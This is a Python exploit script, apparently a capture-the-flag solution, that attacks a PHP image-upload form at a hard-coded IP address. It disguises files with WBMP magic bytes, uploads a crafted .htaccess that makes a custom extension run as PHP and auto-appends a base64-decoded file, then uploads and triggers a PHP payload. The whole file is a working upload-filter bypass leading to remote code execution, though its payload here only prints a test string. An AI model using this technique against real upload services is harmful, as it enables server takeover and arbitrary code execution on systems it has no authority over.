#!/usr/bin/env python3

import requests
import base64

VALID_WBMP = b"\x00\x00\x8a\x39\x8a\x39\x0a"
URL = "http://35.246.234.136/"
RANDOM_DIRECTORY = "ad759ad95e5482e02a15c5d30042b588b6630e64"

COOKIES = {
    "PHPSESSID" : "0e7eal0ji7seg6ac3ck7d2csd8"
}

def upload_content(name, content):

    data = {
        "image" : (name, content, 'image/png'),
        "upload" : (None, "Submit Query", None)
    }

    response = requests.post(URL, files=data, cookies=COOKIES)

HT_ACCESS = VALID_WBMP + b"""
AddType application/x-httpd-php .corb3nik
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.corb3nik"
"""
TARGET_FILE = VALID_WBMP + b"AA" + base64.b64encode(b"""
<?php
  var_dump("works");
?>
""")

upload_content("..htaccess", HT_ACCESS)
upload_content("shell.corb3nik", TARGET_FILE)
upload_content("trigger.corb3nik", VALID_WBMP)


response = requests.post(URL + "/images/" + RANDOM_DIRECTORY + "/trigger.corb3nik")
print(response.text)
